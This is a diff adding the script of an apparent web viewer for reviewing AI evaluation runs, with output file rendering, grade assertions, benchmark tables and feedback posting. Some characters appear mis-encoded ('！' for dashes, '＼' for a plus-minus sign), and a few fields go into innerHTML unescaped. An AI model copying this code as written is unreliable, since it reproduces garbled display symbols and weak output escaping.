+      document.getElementById("feedback-status").textContent = "";
+
+      updateNavButtons();
+
+      // Track visited runs and promote done button when all visited
+      visitedRuns.add(index);
+      const doneBtn = document.getElementById("done-btn");
+      if (visitedRuns.size >= EMBEDDED_DATA.runs.length) {
+        doneBtn.classList.add("ready");
+      }
+
+      // Scroll main content to top
+      document.querySelector(".main").scrollTop = 0;
+    }
+
+    // ---- Render outputs ----
+    function renderOutputs(run) {
+      const container = document.getElementById("outputs-body");
+      container.innerHTML = "";
+
+      const outputs = run.outputs || [];
+      if (outputs.length === 0) {
+        container.innerHTML = '<div class="empty-state">No output files</div>';
+        return;
+      }
+
+      for (const file of outputs) {
+        const fileDiv = document.createElement("div");
+        fileDiv.className = "output-file";
+
+        // Always show file header with download link
+        const header = document.createElement("div");
+        header.className = "output-file-header";
+        const nameSpan = document.createElement("span");
+        nameSpan.textContent = file.name;
+        header.appendChild(nameSpan);
+        const dlBtn = document.createElement("a");
+        dlBtn.className = "dl-btn";
+        dlBtn.textContent = "Download";
+        dlBtn.download = file.name;
+        dlBtn.href = getDownloadUri(file);
+        header.appendChild(dlBtn);
+        fileDiv.appendChild(header);
+
+        const content = document.createElement("div");
+        content.className = "output-file-content";
+
+        if (file.type === "text") {
+          const pre = document.createElement("pre");
+          pre.textContent = file.content;
+          content.appendChild(pre);
+        } else if (file.type === "image") {
+          const img = document.createElement("img");
+          img.src = file.data_uri;
+          img.alt = file.name;
+          content.appendChild(img);
+        } else if (file.type === "pdf") {
+          const iframe = document.createElement("iframe");
+          iframe.src = file.data_uri;
+          content.appendChild(iframe);
+        } else if (file.type === "xlsx") {
+          renderXlsx(content, file.data_b64);
+        } else if (file.type === "binary") {
+          const a = document.createElement("a");
+          a.className = "download-link";
+          a.href = file.data_uri;
+          a.download = file.name;
+          a.textContent = "Download " + file.name;
+          content.appendChild(a);
+        } else if (file.type === "error") {
+          const pre = document.createElement("pre");
+          pre.textContent = file.content;
+          pre.style.color = "var(--red)";
+          content.appendChild(pre);
+        }
+
+        fileDiv.appendChild(content);
+        container.appendChild(fileDiv);
+      }
+    }
+
+    // ---- XLSX rendering via SheetJS ----
+    function renderXlsx(container, b64Data) {
+      try {
+        const raw = Uint8Array.from(atob(b64Data), c => c.charCodeAt(0));
+        const wb = XLSX.read(raw, { type: "array" });
+
+        for (let i = 0; i < wb.SheetNames.length; i++) {
+          const sheetName = wb.SheetNames[i];
+          const ws = wb.Sheets[sheetName];
+
+          if (wb.SheetNames.length > 1) {
+            const sheetLabel = document.createElement("div");
+            sheetLabel.style.cssText =
+              "font-weight:600; font-size:0.8rem; color:#b0aea5; margin-top:0.5rem; margin-bottom:0.25rem;";
+            sheetLabel.textContent = "Sheet: " + sheetName;
+            container.appendChild(sheetLabel);
+          }
+
+          const htmlStr = XLSX.utils.sheet_to_html(ws, { editable: false });
+          const wrapper = document.createElement("div");
+          wrapper.innerHTML = htmlStr;
+          container.appendChild(wrapper);
+        }
+      } catch (err) {
+        container.textContent = "Error rendering spreadsheet: " + err.message;
+      }
+    }
+
+    // ---- Grades ----
+    function renderGrades(run) {
+      const section = document.getElementById("grades-section");
+      const content = document.getElementById("grades-content");
+
+      if (!run.grading) {
+        section.style.display = "none";
+        return;
+      }
+
+      const grading = run.grading;
+      section.style.display = "block";
+      // Reset to collapsed
+      content.classList.remove("open");
+      document.getElementById("grades-arrow").classList.remove("open");
+
+      const summary = grading.summary || {};
+      const expectations = grading.expectations || [];
+
+      let html = '<div style="padding: 1rem;">';
+
+      // Summary line
+      const passRate = summary.pass_rate != null
+        ? Math.round(summary.pass_rate * 100) + "%"
+        : "?";
+      const badgeClass = summary.pass_rate >= 0.8 ? "grade-pass" : summary.pass_rate >= 0.5 ? "" : "grade-fail";
+      html += '<div class="grades-summary">';
+      html += '<span class="grade-badge ' + badgeClass + '">' + passRate + '</span>';
+      html += '<span>' + (summary.passed || 0) + ' passed, ' + (summary.failed || 0) + ' failed of ' + (summary.total || 0) + '</span>';
+      html += '</div>';
+
+      // Assertions list
+      html += '<ul class="assertion-list">';
+      for (const exp of expectations) {
+        const statusClass = exp.passed ? "pass" : "fail";
+        const statusIcon = exp.passed ? "\u2713" : "\u2717";
+        html += '<li class="assertion-item">';
+        html += '<span class="assertion-status ' + statusClass + '">' + statusIcon + '</span>';
+        html += '<span>' + escapeHtml(exp.text) + '</span>';
+        if (exp.evidence) {
+          html += '<div class="assertion-evidence">' + escapeHtml(exp.evidence) + '</div>';
+        }
+        html += '</li>';
+      }
+      html += '</ul>';
+
+      html += '</div>';
+      content.innerHTML = html;
+    }
+
+    function toggleGrades() {
+      const content = document.getElementById("grades-content");
+      const arrow = document.getElementById("grades-arrow");
+      content.classList.toggle("open");
+      arrow.classList.toggle("open");
+    }
+
+    // ---- Previous outputs (collapsible) ----
+    function renderPrevOutputs(run) {
+      const section = document.getElementById("prev-outputs-section");
+      const content = document.getElementById("prev-outputs-content");
+      const prevOutputs = (EMBEDDED_DATA.previous_outputs || {})[run.id];
+
+      if (!prevOutputs || prevOutputs.length === 0) {
+        section.style.display = "none";
+        return;
+      }
+
+      section.style.display = "block";
+      // Reset to collapsed
+      content.classList.remove("open");
+      document.getElementById("prev-outputs-arrow").classList.remove("open");
+
+      // Render the files into the content area
+      content.innerHTML = "";
+      const wrapper = document.createElement("div");
+      wrapper.style.padding = "1rem";
+
+      for (const file of prevOutputs) {
+        const fileDiv = document.createElement("div");
+        fileDiv.className = "output-file";
+
+        const header = document.createElement("div");
+        header.className = "output-file-header";
+        const nameSpan = document.createElement("span");
+        nameSpan.textContent = file.name;
+        header.appendChild(nameSpan);
+        const dlBtn = document.createElement("a");
+        dlBtn.className = "dl-btn";
+        dlBtn.textContent = "Download";
+        dlBtn.download = file.name;
+        dlBtn.href = getDownloadUri(file);
+        header.appendChild(dlBtn);
+        fileDiv.appendChild(header);
+
+        const fc = document.createElement("div");
+        fc.className = "output-file-content";
+
+        if (file.type === "text") {
+          const pre = document.createElement("pre");
+          pre.textContent = file.content;
+          fc.appendChild(pre);
+        } else if (file.type === "image") {
+          const img = document.createElement("img");
+          img.src = file.data_uri;
+          img.alt = file.name;
+          fc.appendChild(img);
+        } else if (file.type === "pdf") {
+          const iframe = document.createElement("iframe");
+          iframe.src = file.data_uri;
+          fc.appendChild(iframe);
+        } else if (file.type === "xlsx") {
+          renderXlsx(fc, file.data_b64);
+        } else if (file.type === "binary") {
+          const a = document.createElement("a");
+          a.className = "download-link";
+          a.href = file.data_uri;
+          a.download = file.name;
+          a.textContent = "Download " + file.name;
+          fc.appendChild(a);
+        }
+
+        fileDiv.appendChild(fc);
+        wrapper.appendChild(fileDiv);
+      }
+
+      content.appendChild(wrapper);
+    }
+
+    function togglePrevOutputs() {
+      const content = document.getElementById("prev-outputs-content");
+      const arrow = document.getElementById("prev-outputs-arrow");
+      content.classList.toggle("open");
+      arrow.classList.toggle("open");
+    }
+
+    // ---- Feedback (saved to server -> feedback.json) ----
+    function saveCurrentFeedback() {
+      const run = EMBEDDED_DATA.runs[currentIndex];
+      const text = document.getElementById("feedback").value;
+
+      if (text.trim() === "") {
+        delete feedbackMap[run.id];
+      } else {
+        feedbackMap[run.id] = text;
+      }
+
+      // Build reviews array from map
+      const reviews = [];
+      for (const [run_id, feedback] of Object.entries(feedbackMap)) {
+        if (feedback.trim()) {
+          reviews.push({ run_id, feedback, timestamp: new Date().toISOString() });
+        }
+      }
+
+      fetch("/api/feedback", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ reviews, status: "in_progress" }),
+      }).then(() => {
+        document.getElementById("feedback-status").textContent = "Saved";
+      }).catch(() => {
+        // Static mode or server unavailable ！ no-op on auto-save,
+        // feedback will be downloaded on final submit
+        document.getElementById("feedback-status").textContent = "Will download on submit";
+      });
+    }
+
+    // ---- Done ----
+    function showDoneDialog() {
+      // Save current textarea to feedbackMap (but don't POST yet)
+      const run = EMBEDDED_DATA.runs[currentIndex];
+      const text = document.getElementById("feedback").value;
+      if (text.trim() === "") {
+        delete feedbackMap[run.id];
+      } else {
+        feedbackMap[run.id] = text;
+      }
+
+      // POST once with status: complete ！ include ALL runs so the model
+      // can distinguish "no feedback" (looks good) from "not reviewed"
+      const reviews = [];
+      const ts = new Date().toISOString();
+      for (const r of EMBEDDED_DATA.runs) {
+        reviews.push({ run_id: r.id, feedback: feedbackMap[r.id] || "", timestamp: ts });
+      }
+      const payload = JSON.stringify({ reviews, status: "complete" }, null, 2);
+      fetch("/api/feedback", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: payload,
+      }).then(() => {
+        document.getElementById("done-overlay").classList.add("visible");
+      }).catch(() => {
+        // Server not available (static mode) ！ download as file
+        const blob = new Blob([payload], { type: "application/json" });
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement("a");
+        a.href = url;
+        a.download = "feedback.json";
+        a.click();
+        URL.revokeObjectURL(url);
+        document.getElementById("done-overlay").classList.add("visible");
+      });
+    }
+
+    function closeDoneDialog() {
+      // Reset status back to in_progress
+      saveCurrentFeedback();
+      document.getElementById("done-overlay").classList.remove("visible");
+    }
+
+    // ---- Toast ----
+    function showToast(message) {
+      const toast = document.getElementById("toast");
+      toast.textContent = message;
+      toast.classList.add("visible");
+      setTimeout(() => toast.classList.remove("visible"), 2000);
+    }
+
+    // ---- Keyboard nav ----
+    document.addEventListener("keydown", (e) => {
+      // Don't capture when typing in textarea
+      if (e.target.tagName === "TEXTAREA") return;
+
+      if (e.key === "ArrowLeft" || e.key === "ArrowUp") {
+        e.preventDefault();
+        navigate(-1);
+      } else if (e.key === "ArrowRight" || e.key === "ArrowDown") {
+        e.preventDefault();
+        navigate(1);
+      }
+    });
+
+    // ---- Util ----
+    function getDownloadUri(file) {
+      if (file.data_uri) return file.data_uri;
+      if (file.data_b64) return "data:application/octet-stream;base64," + file.data_b64;
+      if (file.type === "text") return "data:text/plain;charset=utf-8," + encodeURIComponent(file.content);
+      return "#";
+    }
+
+    function escapeHtml(text) {
+      const div = document.createElement("div");
+      div.textContent = text;
+      return div.innerHTML;
+    }
+
+    // ---- View switching ----
+    function switchView(view) {
+      document.querySelectorAll(".view-tab").forEach(t => t.classList.remove("active"));
+      document.querySelectorAll(".view-panel").forEach(p => p.classList.remove("active"));
+      document.querySelector(`[onclick="switchView('${view}')"]`).classList.add("active");
+      document.getElementById("panel-" + view).classList.add("active");
+    }
+
+    // ---- Benchmark rendering ----
+    function renderBenchmark() {
+      const data = EMBEDDED_DATA.benchmark;
+      if (!data) return;
+
+      // Show the tabs
+      document.getElementById("view-tabs").style.display = "flex";
+
+      const container = document.getElementById("benchmark-content");
+      const summary = data.run_summary || {};
+      const metadata = data.metadata || {};
+      const notes = data.notes || [];
+
+      let html = "";
+
+      // Header
+      html += "<h2 style='font-family: Poppins, sans-serif; margin-bottom: 0.5rem;'>Benchmark Results</h2>";
+      html += "<p style='color: var(--text-muted); font-size: 0.875rem; margin-bottom: 1.25rem;'>";
+      if (metadata.skill_name) html += "<strong>" + escapeHtml(metadata.skill_name) + "</strong> &mdash; ";
+      if (metadata.timestamp) html += metadata.timestamp + " &mdash; ";
+      if (metadata.evals_run) html += "Evals: " + metadata.evals_run.join(", ") + " &mdash; ";
+      html += (metadata.runs_per_configuration || "?") + " runs per configuration";
+      html += "</p>";
+
+      // Summary table
+      html += '<table class="benchmark-table">';
+
+      function fmtStat(stat, pct) {
+        if (!stat) return "！";
+        const suffix = pct ? "%" : "";
+        const m = pct ? (stat.mean * 100).toFixed(0) : stat.mean.toFixed(1);
+        const s = pct ? (stat.stddev * 100).toFixed(0) : stat.stddev.toFixed(1);
+        return m + suffix + " ＼ " + s + suffix;
+      }
+
+      function deltaClass(val) {
+        if (!val) return "";
+        const n = parseFloat(val);
+        if (n > 0) return "benchmark-delta-positive";
+        if (n < 0) return "benchmark-delta-negative";
+        return "";
+      }
+
+      // Discover config names dynamically (everything except "delta")
+      const configs = Object.keys(summary).filter(k => k !== "delta");
+      const configA = configs[0] || "config_a";
+      const configB = configs[1] || "config_b";
+      const labelA = configA.replace(/_/g, " ").replace(/\b\w/g, c => c.toUpperCase());
+      const labelB = configB.replace(/_/g, " ").replace(/\b\w/g, c => c.toUpperCase());
+      const a = summary[configA] || {};
+      const b = summary[configB] || {};
+      const delta = summary.delta || {};
+
+      html += "<thead><tr><th>Metric</th><th>" + escapeHtml(labelA) + "</th><th>" + escapeHtml(labelB) + "</th><th>Delta</th></tr></thead>";
+      html += "<tbody>";
+
+      html += "<tr><td><strong>Pass Rate</strong></td>";
+      html += "<td>" + fmtStat(a.pass_rate, true) + "</td>";
+      html += "<td>" + fmtStat(b.pass_rate, true) + "</td>";
+      html += '<td class="' + deltaClass(delta.pass_rate) + '">' + (delta.pass_rate || "！") + "</td></tr>";
+
+      // Time (only show row if data exists)
+      if (a.time_seconds || b.time_seconds) {
+        html += "<tr><td><strong>Time (s)</strong></td>";
+        html += "<td>" + fmtStat(a.time_seconds, false) + "</td>";
+        html += "<td>" + fmtStat(b.time_seconds, false) + "</td>";
+        html += '<td class="' + deltaClass(delta.time_seconds) + '">' + (delta.time_seconds ? delta.time_seconds + "s" : "！") + "</td></tr>";
+      }
+
+      // Tokens (only show row if data exists)
+      if (a.tokens || b.tokens) {
+        html += "<tr><td><strong>Tokens</strong></td>";
+        html += "<td>" + fmtStat(a.tokens, false) + "</td>";
+        html += "<td>" + fmtStat(b.tokens, false) + "</td>";
+        html += '<td class="' + deltaClass(delta.tokens) + '">' + (delta.tokens || "！") + "</td></tr>";
+      }
+
+      html += "</tbody></table>";
+
+      // Per-eval breakdown (if runs data available)
+      const runs = data.runs || [];
+      if (runs.length > 0) {
+        const evalIds = [...new Set(runs.map(r => r.eval_id))].sort((a, b) => a - b);
+
+        html += "<h3 style='font-family: Poppins, sans-serif; margin-bottom: 0.75rem;'>Per-Eval Breakdown</h3>";
+
+        const hasTime = runs.some(r => r.result && r.result.time_seconds != null);
+        const hasErrors = runs.some(r => r.result && r.result.errors > 0);
+
+        for (const evalId of evalIds) {
+          const evalRuns = runs.filter(r => r.eval_id === evalId);
+          const evalName = evalRuns[0] && evalRuns[0].eval_name ? evalRuns[0].eval_name : "Eval " + evalId;
+
+          html += "<h4 style='font-family: Poppins, sans-serif; margin: 1rem 0 0.5rem; color: var(--text);'>" + escapeHtml(evalName) + "</h4>";
+          html += '<table class="benchmark-table">';
+          html += "<thead><tr><th>Config</th><th>Run</th><th>Pass Rate</th>";
+          if (hasTime) html += "<th>Time (s)</th>";
+          if (hasErrors) html += "<th>Crashes During Execution</th>";
+          html += "</tr></thead>";
+          html += "<tbody>";
+
+          // Group by config and render with average rows
+          const configGroups = [...new Set(evalRuns.map(r => r.configuration))];
+          for (let ci = 0; ci < configGroups.length; ci++) {
+            const config = configGroups[ci];
+            const configRuns = evalRuns.filter(r => r.configuration === config);
+            if (configRuns.length === 0) continue;
+
+            const rowClass = ci === 0 ? "benchmark-row-with" : "benchmark-row-without";
+            const configLabel = config.replace(/_/g, " ").replace(/\b\w/g, c => c.toUpperCase());
+
+            for (const run of configRuns) {
+              const r = run.result || {};
+              const prClass = r.pass_rate >= 0.8 ? "benchmark-delta-positive" : r.pass_rate < 0.5 ? "benchmark-delta-negative" : "";
+              html += '<tr class="' + rowClass + '">';
+              html += "<td>" + configLabel + "</td>";
+              html += "<td>" + run.run_number + "</td>";
+              html += '<td class="' + prClass + '">' + ((r.pass_rate || 0) * 100).toFixed(0) + "% (" + (r.passed || 0) + "/" + (r.total || 0) + ")</td>";
+              if (hasTime) html += "<td>" + (r.time_seconds != null ? r.time_seconds.toFixed(1) : "！") + "</td>";
+              if (hasErrors) html += "<td>" + (r.errors || 0) + "</td>";
+              html += "</tr>";
+            }
+
+            // Average row
+            const rates = configRuns.map(r => (r.result || {}).pass_rate || 0);
+            const avgRate = rates.reduce((a, b) => a + b, 0) / rates.length;
+            const avgPrClass = avgRate >= 0.8 ? "benchmark-delta-positive" : avgRate < 0.5 ? "benchmark-delta-negative" : "";
+            html += '<tr class="benchmark-row-avg ' + rowClass + '">';
+            html += "<td>" + configLabel + "</td>";
+            html += "<td>Avg</td>";
+            html += '<td class="' + avgPrClass + '">' + (avgRate * 100).toFixed(0) + "%</td>";
+            if (hasTime) {
+              const times = configRuns.map(r => (r.result || {}).time_seconds).filter(t => t != null);
+              html += "<td>" + (times.length ? (times.reduce((a, b) => a + b, 0) / times.length).toFixed(1) : "！") + "</td>";
+            }
+            if (hasErrors) html += "<td></td>";
+            html += "</tr>";
+          }
+          html += "</tbody></table>";
+
+          // Per-assertion detail for this eval
+          const runsWithExpectations = {};
+          for (const config of configGroups) {
+            runsWithExpectations[config] = evalRuns.filter(r => r.configuration === config && r.expectations && r.expectations.length > 0);
+          }
+          const hasAnyExpectations = Object.values(runsWithExpectations).some(runs => runs.length > 0);
+          if (hasAnyExpectations) {
+            // Collect all unique assertion texts across all configs
+            const allAssertions = [];
+            const seen = new Set();
+            for (const config of configGroups) {
+              for (const run of runsWithExpectations[config]) {
+                for (const exp of (run.expectations || [])) {
+                  if (!seen.has(exp.text)) {
+                    seen.add(exp.text);
+                    allAssertions.push(exp.text);
+                  }
+                }
+              }
+            }
+
+            html += '<table class="benchmark-table" style="margin-top: 0.5rem;">';
+            html += "<thead><tr><th>Assertion</th>";
+            for (const config of configGroups) {
+              const label = config.replace(/_/g, " ").replace(/\b\w/g, c => c.toUpperCase());
+              html += "<th>" + escapeHtml(label) + "</th>";
+            }
+            html += "</tr></thead><tbody>";
+
+            for (const assertionText of allAssertions) {
+              html += "<tr><td>" + escapeHtml(assertionText) + "</td>";
+
+              for (const config of configGroups) {
+                html += "<td>";
+                for (const run of runsWithExpectations[config]) {
+                  const exp = (run.expectations || []).find(e => e.text === assertionText);
+                  if (exp) {
+                    const cls = exp.passed ? "benchmark-delta-positive" : "benchmark-delta-negative";
+                    const icon = exp.passed ? "\u2713" : "\u2717";
+                    html += '<span class="' + cls + '" title="Run ' + run.run_number + ': ' + escapeHtml(exp.evidence || "") + '">' + icon + "</span> ";
+                  } else {
+                    html += "！ ";
+                  }
+                }
+                html += "</td>";
+              }
+              html += "</tr>";
+            }
+            html += "</tbody></table>";
+          }
+        }
+      }
+
+      // Notes
+      if (notes.length > 0) {
+        html += '<div class="benchmark-notes">';
+        html += "<h3>Analysis Notes</h3>";
+        html += "<ul>";
+        for (const note of notes) {
+          html += "<li>" + escapeHtml(note) + "</li>";
+        }
+        html += "</ul></div>";
+      }
+
+      container.innerHTML = html;
+    }
+
+    // ---- Start ----
+    init();
+    renderBenchmark();
+  </script>
+</body>
+</html>
